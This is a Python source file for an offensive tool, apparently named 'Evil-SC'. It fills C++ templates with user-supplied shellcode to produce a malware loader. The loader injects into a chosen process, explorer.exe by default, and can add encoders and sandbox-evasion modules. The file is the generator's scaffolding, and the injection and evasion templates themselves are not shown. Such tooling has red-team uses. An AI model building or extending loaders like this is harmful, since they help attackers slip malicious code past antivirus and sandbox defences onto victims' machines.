import argparse
import os
from colorama import init, Fore
from core.utils.raw2shell import raw2shell

def banner():
    init(autoreset=True)

    ascii_art = f"""
    {Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗   {Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}╗      {Fore.CYAN}███████{Fore.GREEN}╗ {Fore.CYAN}██████{Fore.GREEN}╗
    {Fore.CYAN}██{Fore.GREEN}╔════╝{Fore.CYAN}██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║      {Fore.CYAN}██{Fore.GREEN}╔════╝{Fore.CYAN}██{Fore.GREEN}╔════╝
    {Fore.CYAN}█████{Fore.GREEN}╗  {Fore.CYAN}██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}█████{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║     
    {Fore.CYAN}██{Fore.GREEN}╔══╝  ╚{Fore.CYAN}██{Fore.GREEN}╗ {Fore.CYAN}██{Fore.GREEN}╔╝{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║╚════╝╚════{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║     
    {Fore.CYAN}███████{Fore.GREEN}╗ ╚{Fore.CYAN}████{Fore.GREEN}╔╝ {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗ {Fore.CYAN}███████{Fore.GREEN}║╚{Fore.CYAN}██████{Fore.GREEN}╗
    {Fore.GREEN}╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══════╝ ╚═════╝
    {Fore.CYAN}                                             @v4resk                         
    """

    print(ascii_art)

class esc:
    def __init__(self):
        self.target_process = ""
        self.shellcode_variable = ""
        self.method_file = ""
        self.independent_encoder_files = []
        self.encoder_files = []
        self.sandbox_evasion = []

    

    def parse_arguments(self):
        parser = argparse.ArgumentParser(description='Template-based shellcode loader')
        parser.add_argument('shellcode_variable', metavar='shellcode', help='Specify the shellcode variable')
        parser.add_argument('--method', '-m', dest='method_folder', required=True, metavar='METHOD',
                            help=f'Specify a method ({", ".join(self.get_available_methods())})')
        parser.add_argument('--process', '-p', dest='target_process',metavar='PROCESS_NAME', default="explorer.exe",
                            help='Specify the target process')
        parser.add_argument('--independent-encoder', '-ie', action='append', dest='encoder_files', metavar='ENCODER',
                            help='Specify a loader-independent encoder (sgn)')
        parser.add_argument('--encoder', '-e', action='append', dest='dependent_encoder_files', metavar='ENCODER',
                            help=f'Specify a loader-dependent encoder ({", ".join(self.get_available_files("encoders"))})')
        parser.add_argument('--sandbox-evasion', '-se', action='append', dest='sandbox_evasion', metavar='SANDBOX_EVASION',
                            help=f'Specify sandbox evasion techniques ({", ".join(self.get_available_files("sandbox_evasion"))})')
        return parser.parse_args()

    def get_available_files(self, folder):
        template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', folder)
        if not os.path.exists(template_folder):
            os.makedirs(template_folder)
        available_files = [file[:-4] for file in os.listdir(template_folder) if file.endswith('.cpp')]
        return available_files

    def get_available_methods(self):
        methods_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'methods')
        if not os.path.exists(methods_folder):
            os.makedirs(methods_folder)
        available_methods = [folder for folder in os.listdir(methods_folder) if os.path.isdir(os.path.join(methods_folder, folder))]
        return available_methods

    def process_method_folder(self, method_folder):
        folder_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'methods', method_folder)
        if not os.path.exists(folder_path):
            print(f"Error: Method folder '{method_folder}' not found.")
            return None, None

        cpp_file_path = os.path.join(folder_path, f'{method_folder}.cpp')
        includes_file_path = os.path.join(folder_path, f'{method_folder}.includes')

        if not os.path.exists(cpp_file_path):
            print(f"Error: File '{method_folder}.cpp' not found in '{folder_path}'.")
            return None, None

        return cpp_file_path, includes_file_path

    def process_files(self, files, folder):
        if files is None:
            return []
        
        processed_files = []
        for file in files:
            file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', folder, f'{file}.cpp')
            if os.path.exists(file_path):
                processed_files.append(file_path)
            else:
                print(f"Warning: File '{file}.cpp' not found in '{folder}'")
        return processed_files
    
    def generate_evil_sc_file(self):
        template_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'LoaderTemplate', 'template.cpp')
        
        with open(template_path, "r") as template_file:
            template_content = template_file.read()

        # Replace ###METHOD_MAIN### with user's chosen method content
        method_content = ""
        with open(self.method_file, "r") as method_file:
            method_content = method_file.read()

        # Replace ###METHOD_INCLUDES### with user's chosen method includes content
        method_includes_content = ""
        with open(self.method_includes, "r") as includes_file:
            method_includes_content = includes_file.read()

        # Replace ###DECODE_FUNCTION### with user's chosen encoder content
        encoder_content = ""
        for encoder_file in self.encoder_files:
            with open(encoder_file, "r") as encoder_file_content:
                encoder_content += encoder_file_content.read() + '\n'

        evil_sc_content = template_content.replace("###METHOD_MAIN###", method_content)
        evil_sc_content = evil_sc_content.replace("###METHOD_INCLUDES###", method_includes_content)
        evil_sc_content = evil_sc_content.replace("###DECODE_FUNCTION###", encoder_content)
        evil_sc_content = evil_sc_content.replace("###TARGET_PROCESS###", self.target_process)
        evil_sc_content = evil_sc_content.replace("###SHELLCODE###", raw2shell(self.shellcode_variable))
        

        output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates', 'LoaderTemplate', 'evil-sc.cpp')
        with open(output_path, "w") as evil_sc_file:
            evil_sc_file.write(evil_sc_content)
        print(f"\n{Fore.CYAN}Output: {Fore.WHITE}{output_path}")

        

    def run(self):
        args = self.parse_arguments()

        self.shellcode_variable = args.shellcode_variable
        self.target_process = args.target_process

        self.method_file, self.method_includes = self.process_method_folder(args.method_folder)
        if self.method_file is None:
            return

        self.encoder_files = self.process_files(args.dependent_encoder_files, 'encoders')
        self.sandbox_evasion = self.process_files(args.sandbox_evasion, 'sandbox_evasion')

        print(f'{Fore.GREEN}Shellcode:\t\t{Fore.WHITE} {self.shellcode_variable}')
        print(f'{Fore.GREEN}Method File:\t\t{Fore.WHITE} {self.method_file}')
        print(f'{Fore.GREEN}Method Includes File:\t{Fore.WHITE} {self.method_includes}')
        print(f'{Fore.GREEN}Encoders:\t\t{Fore.WHITE}{self.encoder_files}')
        print(f'{Fore.GREEN}Sandbox Evasion:\t{Fore.WHITE}{self.sandbox_evasion}')
        print(f'{Fore.GREEN}Target Process:\t\t{Fore.WHITE}{self.target_process}')


        self.generate_evil_sc_file()